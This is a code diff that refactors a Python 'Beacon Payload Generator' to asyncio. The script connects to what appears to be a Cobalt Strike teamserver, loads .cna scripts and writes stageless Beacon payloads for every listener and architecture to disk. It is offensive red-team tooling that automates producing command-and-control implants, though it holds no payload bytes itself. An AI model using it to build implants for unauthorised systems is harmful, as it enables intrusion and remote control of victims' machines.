@@ -1,5 +1,5 @@
 #!/usr/local/bin/python3
-from os import linesep
+import os
 from sleep_python_bridge.striker import ArtifactType, CSConnector
 
 from argparse import ArgumentParser
@@ -8,6 +8,7 @@ from pathlib import Path, PurePath
 import json
 import time
 import glob
+import asyncio
 ####################
 ## Variables
 
@@ -18,7 +19,10 @@ hostPayload = False
 datafile = "payloads.json"
 
 # payloadpath
-payloadPath = "output/payloads/"
+script_dir = Path(__file__).resolve().parent
+payloadPath = script_dir / "output" / "payloads"
+os.makedirs(payloadPath, exist_ok=True)
+
 
 ####################
 ## FUNCTIONS
@@ -47,13 +51,13 @@ def parseArguments():
     return args
 
 
-def write_payload(payloadPath,payloadName,payloadBytes,hostPayload=hostPayload):
+async def write_payload(payloadPath,payloadName,payloadBytes,hostPayload=hostPayload):
 
     filename = PurePath(payloadPath,payloadName)
     with open(filename, 'wb') as file:
         file.write(payloadBytes)
 
-def main(args):
+async def main(args):
 
     cs_host = args.host
     cs_port = args.port
@@ -75,7 +79,7 @@ def main(args):
     ####################
     ## Connect to server
     print(f"[*] Connecting to teamserver: {cs_host}")
-    with CSConnector(
+    async with CSConnector(
         cs_host=cs_host, 
         cs_port=cs_port, 
         cs_user=cs_user, 
@@ -85,11 +89,11 @@ def main(args):
         # Load external scripts (if desired)
         print("Loading cna scripts from ./payload_scripts")
         for script in glob.glob("./payload_scripts/*.cna"):
-            cs.ag_load_script(Path(script).resolve())
+            await cs.ag_load_script(Path(script).resolve())
 
         #time.sleep(3) # Allow time for the scripts to load
         # Output the loaded scripts
-        loadedScripts = cs.ag_ls_scripts()
+        loadedScripts = await cs.ag_ls_scripts()
         print(loadedScripts)
 
         payloadTypes = {
@@ -108,7 +112,7 @@ def main(args):
         payloads = [x for x in cs_types.split(',') if x in payloadTypes]
 
         # Generate the payloads for each listener
-        listeners = cs.get_listeners_stageless()
+        listeners = await cs.get_listeners_stageless()
         for listener in listeners:
             if cs_listener != 'all' and listener.lower() != cs_listener.lower():
                 continue
@@ -119,8 +123,8 @@ def main(args):
                 for k in payloads:
                     payloadName = f'{listener}.{arch}.{k}'
                     print(f"[*] Creating {payloadName}")
-                    payloadBytes = cs.generatePayload(listener, payloadTypes[k], False, arch == 'x64', cs_exit, cs_callmethod)
-                    write_payload(payloadPath, payloadName, payloadBytes, hostPayload)
+                    payloadBytes = await cs.generatePayload(listener, payloadTypes[k], False, arch == 'x64', cs_exit, cs_callmethod)
+                    await write_payload(payloadPath, payloadName, payloadBytes, hostPayload)
 
     #########
 
@@ -129,4 +133,4 @@ if __name__ == "__main__":
     print("Beacon Payload Generator")
     print("------------------------")
     args = parseArguments()
-    main(args)
+    asyncio.run(main(args))
